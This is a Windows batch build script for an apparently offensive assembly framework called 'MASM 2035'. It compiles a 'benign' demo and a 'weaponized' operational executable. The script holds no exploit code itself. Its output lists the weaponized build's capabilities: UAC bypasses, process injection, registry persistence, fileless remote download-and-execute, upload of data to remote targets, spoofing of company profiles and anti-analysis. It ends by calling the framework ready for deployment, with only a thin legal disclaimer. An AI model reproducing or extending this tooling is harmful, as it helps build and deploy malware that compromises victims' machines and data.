@echo off
echo ========================================================================================
echo MASM 2035 - ENHANCED MULTI-STUB DUAL BUILD SYSTEM
echo Builds both BENIGN and WEAPONIZED versions with full PE manipulation
echo ========================================================================================
echo.

REM Check if MASM32 is installed
if not exist "C:\masm32\bin\ml.exe" (
    echo ERROR: MASM32 not found!
    echo Please install MASM32 SDK from: http://www.masm32.com/
    echo Expected location: C:\masm32\
    pause
    exit /b 1
)

REM Set MASM32 environment variables
set MASM32_PATH=C:\masm32
set PATH=%MASM32_PATH%\bin;%PATH%
set INCLUDE=%MASM32_PATH%\include;%INCLUDE%
set LIB=%MASM32_PATH%\lib;%LIB%

echo MASM32 Environment Set:
echo - PATH: %MASM32_PATH%\bin
echo - INCLUDE: %MASM32_PATH%\include  
echo - LIB: %MASM32_PATH%\lib
echo.

REM Check which build to create
if "%1"=="benign" goto build_benign_only
if "%1"=="weaponized" goto build_weaponized_only
if "%1"=="both" goto build_both
if "%1"=="" goto build_both

echo Usage: %0 [benign^|weaponized^|both]
echo   benign      - Build only the benign demonstration version
echo   weaponized  - Build only the weaponized operational version  
echo   both        - Build both versions (default)
echo.
goto build_both

:build_both
echo Building BOTH versions: Benign + Weaponized
echo ========================================================================================
call :build_benign_version
if errorlevel 1 exit /b 1
echo.
call :build_weaponized_version
if errorlevel 1 exit /b 1
goto build_complete

:build_benign_only
echo Building BENIGN version only
echo ========================================================================================
call :build_benign_version
if errorlevel 1 exit /b 1
goto build_complete

:build_weaponized_only
echo Building WEAPONIZED version only
echo ========================================================================================
call :build_weaponized_version
if errorlevel 1 exit /b 1
goto build_complete

:build_benign_version
echo.
echo ========================================================================================
echo BUILDING: BENIGN VERSION (Demonstration/Educational)
echo ========================================================================================

REM Clean previous benign builds
echo Cleaning previous benign builds...
if exist "MASM_2035_BENIGN.obj" del "MASM_2035_BENIGN.obj"
if exist "MASM_2035_BENIGN.exe" del "MASM_2035_BENIGN.exe"
if exist "MASM_2035_BENIGN.lst" del "MASM_2035_BENIGN.lst"
if exist "MASM_2035_BENIGN.pdb" del "MASM_2035_BENIGN.pdb"

REM Create benign version preprocessor defines
echo Creating benign configuration...
copy "MASM_2035_ENHANCED_MULTISTUB.asm" "MASM_2035_BENIGN_TEMP.asm" >nul

REM Modify for benign mode (set benign_mode = 1 by default)
powershell -Command "(Get-Content 'MASM_2035_BENIGN_TEMP.asm') -replace 'benign_mode.*dd 0', 'benign_mode             dd 1                      ; FORCED BENIGN MODE' | Set-Content 'MASM_2035_BENIGN_TEMP.asm'"

echo Assembling BENIGN version...
ml.exe /c /coff /Cp /W3 /WX /Zi /Zd /Fl /Fm /Fo"MASM_2035_BENIGN.obj" MASM_2035_BENIGN_TEMP.asm

if errorlevel 1 (
    echo.
    echo BENIGN ASSEMBLY FAILED!
    echo Check the source code for syntax errors.
    del "MASM_2035_BENIGN_TEMP.asm" >nul 2>&1
    exit /b 1
)

echo Linking BENIGN executable...
link.exe /subsystem:windows /debug /debugtype:cv /machine:x86 /opt:ref /opt:icf /out:"MASM_2035_BENIGN.exe" MASM_2035_BENIGN.obj

if errorlevel 1 (
    echo.
    echo BENIGN LINKING FAILED!
    del "MASM_2035_BENIGN_TEMP.asm" >nul 2>&1
    exit /b 1
)

REM Clean up temporary file
del "MASM_2035_BENIGN_TEMP.asm" >nul 2>&1

echo.
echo ✅ BENIGN VERSION BUILD SUCCESSFUL!
echo 📁 File: MASM_2035_BENIGN.exe
echo 🎯 Purpose: Educational/Demonstration (no weaponized features)
echo 📊 Features: Company profiles, mutex systems, anti-analysis detection only
exit /b 0

:build_weaponized_version
echo.
echo ========================================================================================
echo BUILDING: WEAPONIZED VERSION (Operational/Research) 
echo ========================================================================================

REM Clean previous weaponized builds
echo Cleaning previous weaponized builds...
if exist "MASM_2035_WEAPONIZED.obj" del "MASM_2035_WEAPONIZED.obj"
if exist "MASM_2035_WEAPONIZED.exe" del "MASM_2035_WEAPONIZED.exe"
if exist "MASM_2035_WEAPONIZED.lst" del "MASM_2035_WEAPONIZED.lst"
if exist "MASM_2035_WEAPONIZED.pdb" del "MASM_2035_WEAPONIZED.pdb"

REM Create weaponized version (default configuration)
echo Creating weaponized configuration...
copy "MASM_2035_ENHANCED_MULTISTUB.asm" "MASM_2035_WEAPONIZED_TEMP.asm" >nul

REM Add weaponized banner comment
powershell -Command "(Get-Content 'MASM_2035_WEAPONIZED_TEMP.asm') -replace '; MASM 2035 - ENHANCED MULTI-STUB PURE ASSEMBLY IMPLEMENTATION', '; MASM 2035 - WEAPONIZED MULTI-STUB FRAMEWORK - OPERATIONAL VERSION' | Set-Content 'MASM_2035_WEAPONIZED_TEMP.asm'"

echo Assembling WEAPONIZED version...
ml.exe /c /coff /Cp /W3 /WX /Zi /Zd /Fl /Fm /Fo"MASM_2035_WEAPONIZED.obj" MASM_2035_WEAPONIZED_TEMP.asm

if errorlevel 1 (
    echo.
    echo WEAPONIZED ASSEMBLY FAILED!
    echo Check the source code for syntax errors.
    del "MASM_2035_WEAPONIZED_TEMP.asm" >nul 2>&1
    exit /b 1
)

echo Linking WEAPONIZED executable...
link.exe /subsystem:windows /debug /debugtype:cv /machine:x86 /opt:ref /opt:icf /out:"MASM_2035_WEAPONIZED.exe" MASM_2035_WEAPONIZED.obj

if errorlevel 1 (
    echo.
    echo WEAPONIZED LINKING FAILED!
    del "MASM_2035_WEAPONIZED_TEMP.asm" >nul 2>&1
    exit /b 1
)

REM Clean up temporary file
del "MASM_2035_WEAPONIZED_TEMP.asm" >nul 2>&1

echo.
echo ✅ WEAPONIZED VERSION BUILD SUCCESSFUL!
echo 📁 File: MASM_2035_WEAPONIZED.exe
echo 🎯 Purpose: Operational/Research (full capabilities)
echo ⚠️  WARNING: Contains active exploit methods and UAC bypasses
echo 📊 Features: ALL features enabled including fileless download/execute
exit /b 0

:build_complete
echo.
echo ========================================================================================
echo 🏆 MASM 2035 DUAL BUILD SYSTEM COMPLETE!
echo ========================================================================================
echo.

REM Display build summary
if exist "MASM_2035_BENIGN.exe" (
    echo ✅ BENIGN VERSION READY:
    echo    📁 MASM_2035_BENIGN.exe
    echo    🎓 Educational/demonstration purposes
    echo    📊 Safe for analysis and reverse engineering
    echo    🔒 No active exploit methods
    dir "MASM_2035_BENIGN.exe" | find "MASM_2035_BENIGN.exe"
    echo.
)

if exist "MASM_2035_WEAPONIZED.exe" (
    echo ⚔️  WEAPONIZED VERSION READY:
    echo    📁 MASM_2035_WEAPONIZED.exe  
    echo    🎯 Operational/research purposes
    echo    ⚠️  Contains active exploit methods
    echo    🔓 Full UAC bypass capabilities
    echo    🌐 Fileless download/execute system
    echo    📤 6x6 backup upload/download system
    echo    🎭 Multiple stub variants (6 styles)
    echo    🏢 Company profile spoofing (5 companies)
    echo    💻 Full PE manipulation capabilities
    dir "MASM_2035_WEAPONIZED.exe" | find "MASM_2035_WEAPONIZED.exe"
    echo.
)

echo 📋 FEATURE COMPARISON:
echo ┌─────────────────────────────────┬─────────────┬─────────────────┐
echo │ Feature                         │ Benign      │ Weaponized      │
echo ├─────────────────────────────────┼─────────────┼─────────────────┤
echo │ Company Profile Spoofing        │ ✅ Display  │ ✅ Active       │
echo │ Advanced Mutex Systems          │ ✅ Demo     │ ✅ Full (40+)   │
echo │ Anti-Analysis Detection         │ ✅ Report   │ ✅ Active       │
echo │ Windows Run Exploits            │ ❌ Disabled │ ✅ All 12       │
echo │ UAC Bypass Methods              │ ❌ Disabled │ ✅ 4 Methods    │
echo │ Fileless Download/Execute       │ ❌ Disabled │ ✅ 6 Sources    │
echo │ Backup Upload System            │ ❌ Disabled │ ✅ 6 Targets    │
echo │ PE Manipulation                 │ ❌ Disabled │ ✅ Full         │
echo │ Process Injection               │ ❌ Disabled │ ✅ Multiple     │
echo │ Registry Persistence            │ ❌ Disabled │ ✅ Active       │
echo │ Multi-Stub Variants             │ ✅ Demo     │ ✅ All 6        │
echo └─────────────────────────────────┴─────────────┴─────────────────┘
echo.

echo 🔧 USAGE:
echo   Benign:      MASM_2035_BENIGN.exe      (Safe for testing/education)
echo   Weaponized:  MASM_2035_WEAPONIZED.exe  (Research/authorized testing only)
echo.

echo ⚖️  LEGAL NOTICE:
echo   - Benign version: Safe for educational purposes
echo   - Weaponized version: Research/authorized testing ONLY
echo   - Users are responsible for compliance with applicable laws
echo   - Intended for security research and defense development
echo.

echo 🎯 BUILD TARGETS ACHIEVED:
echo   ✅ Multiple stub styles (Stub71, 85, 99, Phantom, Ghost, Shadow)
echo   ✅ Windows Run exploits and UAC bypasses  
echo   ✅ Fileless remote download/execute with crypto
echo   ✅ 6+6 download/upload backup system
echo   ✅ Full PE manipulation and injection
echo   ✅ Dual build system (benign + weaponized)
echo   ✅ Pure MASM assembly implementation
echo.

echo ========================================================================================
echo 🚀 MASM 2035 Enhanced Multi-Stub Framework Ready for Deployment!
echo ========================================================================================
pause
exit /b 0